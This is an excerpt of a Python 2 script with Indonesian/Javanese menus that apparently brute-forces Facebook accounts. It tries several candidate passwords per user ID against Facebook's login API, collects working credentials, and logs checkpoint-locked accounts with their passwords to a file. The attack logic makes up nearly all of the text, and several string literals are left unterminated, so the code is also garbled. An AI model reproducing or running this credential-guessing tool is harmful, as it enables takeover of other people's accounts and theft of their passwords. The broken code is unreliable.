...
def pilih_masuk():
	msuk = raw_input("\033[1;97m Ngocok ")
	if msuk =="":
		print"\033[1;97m Isi Yang Bener Sayang !" '\n'
		pilih_masuk()
...
def tokenz():
	...
	try:
		...
		zedd.write(toket)
		zedd.close()
		jalan ('\033[1;92m Login Sukses')
		menu()
	except KeyError:
		print "\033[1;93m Tokenmu Bosok !"
		time.sleep(1)
		masuk()
...
def menu():
	...
	try:
		...
		print" Koneksi Error, Paketmu Entek Bos"
		keluar()
	os.system("clear")
	print logo
	print "\033[1;97m _______________________________________"
...
######PILIH######
def pilih():
	unikers = raw_input("\033[1;97m Pilih Karepmu:) ")
	if unikers =="":
		print "\033[1;97m _______________________________________"
		pilih()
...
#### PILIH INDONESIA ####
def pilih_indo():
	teak = raw_input("\033[1;97m Dipilih Pilih ")
	print "\033[1;97m _______________________________________"
	if teak =="":
		print"\033[1;97m Isi Sing Bener Cok !"
		pilih_indo()
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in w:
				...
				z = json.loads(x.text)
				print '\033[1;92m --> ' + user + '|' + pass1 + ' oks.append(user+pass1)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\033[1;93m --> ' + user + '|' + pass1 + ' cek = open("out/super_cp.txt", "a")
					cek.write("\nID:" +user+ " Pw:" +pass1+ ")
					cek.close()
					...
					if 'access_token' in w:
						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
						z = json.loads(x.text)
						print '\033[1;92m --> ' + user + '|' + pass2 + ' oks.append(user+pass2)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '\033[1;93m --> ' + user + '|' + pass2 + ' cek = open("out/super_cp.txt", "a")
							cek.write("\nID:" +user+ " Pw:" +pass2+ ")
							cek.close()
							...
							if 'access_token' in w:
								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
								z = json.loads(x.text)
								print '\033[1;92m --> ' + user + '|' + pass3 + ' oks.append(user+pass3)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '\033[1;93m --> ' + user + '|' + pass3 + ' cek = open("out/super_cp.txt", "a")
									cek.write("\nID:" +user+ " Pw:" +pass3+ ")
									cek.close()
